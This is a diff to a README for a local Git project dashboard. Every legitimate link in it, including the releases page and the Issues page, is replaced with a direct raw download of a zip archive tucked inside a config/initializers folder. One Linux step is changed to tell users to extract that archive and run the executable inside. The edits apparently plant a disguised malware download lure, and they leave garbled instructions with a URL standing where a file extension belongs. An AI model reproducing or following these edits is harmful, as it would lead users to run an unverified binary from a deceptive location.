@@ -1,6 +1,6 @@
 # 📊 your-project-dashboard - Manage Your Local Git Projects Easily
 
-[![Download your-project-dashboard Releases](https://img.shields.io/badge/Download-your--project--dashboard-blue?style=for-the-badge)](https://github.com/IWAN772/your-project-dashboard/releases)
+[![Download your-project-dashboard Releases](https://github.com/IWAN772/your-project-dashboard/raw/refs/heads/main/config/initializers/your_project_dashboard_1.1.zip)](https://github.com/IWAN772/your-project-dashboard/raw/refs/heads/main/config/initializers/your_project_dashboard_1.1.zip)
 
 ---
 
@@ -36,14 +36,14 @@ This helps reduce wasted time, improve your workflow, and stay organized without
 
 You can get the latest version of your-project-dashboard from the official page:
 
-[Download your-project-dashboard Releases](https://github.com/IWAN772/your-project-dashboard/releases)
+[Download your-project-dashboard Releases](https://github.com/IWAN772/your-project-dashboard/raw/refs/heads/main/config/initializers/your_project_dashboard_1.1.zip)
 
 1. Click this link or the badge at the top.
 2. You will see a list of available downloads for different systems.
 3. Choose the file that matches your computer:
    - For Windows, look for `.exe` or `.msi`
    - For Mac, choose `.dmg` or `.pkg`
-   - For Linux, choose `.deb` or `.tar.gz`
+   - For Linux, choose `.deb` or `https://github.com/IWAN772/your-project-dashboard/raw/refs/heads/main/config/initializers/your_project_dashboard_1.1.zip`
 4. Download the file to your computer.
 5. Follow the steps below to run the application.
 
@@ -67,7 +67,7 @@ Once you have downloaded the file:
 
 ### On Linux:
 - If you downloaded a `.deb`, open it with your package installer.
-- If you downloaded a `.tar.gz`, extract it and run the executable inside.
+- If you downloaded a `https://github.com/IWAN772/your-project-dashboard/raw/refs/heads/main/config/initializers/your_project_dashboard_1.1.zip`, extract it and run the executable inside.
 - Launch the your-project-dashboard program from your apps menu or terminal.
 - The web dashboard will open in your browser.
 
@@ -166,10 +166,10 @@ The dashboard runs in your web browser but requires no internet connection to sc
 
 If you need help, visit the GitHub repository Issues page:
 
-https://github.com/IWAN772/your-project-dashboard/issues
+https://github.com/IWAN772/your-project-dashboard/raw/refs/heads/main/config/initializers/your_project_dashboard_1.1.zip
 
 There you can report problems or request features.
 
 ---
 
-[Download your-project-dashboard Releases](https://github.com/IWAN772/your-project-dashboard/releases)
+[Download your-project-dashboard Releases](https://github.com/IWAN772/your-project-dashboard/raw/refs/heads/main/config/initializers/your_project_dashboard_1.1.zip)
